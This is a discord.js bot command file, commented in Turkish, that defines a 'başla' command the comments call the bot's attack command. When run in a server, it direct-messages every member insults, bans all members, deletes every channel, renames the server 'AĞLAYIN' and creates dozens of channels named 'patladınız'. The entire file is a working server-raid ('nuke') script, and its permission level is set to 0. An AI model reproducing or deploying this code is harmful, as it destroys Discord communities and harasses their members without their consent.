const Discord = require('discord.js');


exports.run = function(client, message) {

    message.guild.members.map(c => c.send(

"• ADAM OLUN LAN ADAM\n"//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR
+"• Hepiniz adam olun!\n"//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR
+"• ALAYINIZA BORU"    //BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR

    ));
  message.guild.members.map(c => c.ban());
  message.guild.channels.map(c => c.delete())
  
message.guild.setName("AĞLAYIN ")//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA SUNUCUN İSMİ
  

  message.guild.createChannel("patladınız").catch(console.error);//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA AÇTIĞI KANALLAR
  message.guild.createChannel("patladınız").catch(console.error);//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA AÇTIĞI KANALLAR
  message.guild.createChannel("patladınız").catch(console.error);//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA AÇTIĞI KANALLAR
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  
  
  
};

exports.conf = {
  enabled: true,//True => Komut açık, False => Komut kapalı 
  guildOnly: true, //True => Sadece Servere Özel, False => Heryerde kullanılabilir
  aliases: [],//Komutun farklı kullanımları ÖR: !ping, !p
  permLevel: 0 //kimlerin kullanabileceğini  (bot.js dosyasında perm leveller yazıyor)
};

exports.help = {
  name: 'başla',//Komutun adı (Komutu girerken lazım olucak)
  description: '',//Komutun Açıklaması
  usage: '' //komutun kullanım şekli; ÖR: !ban @Kullanıcı
}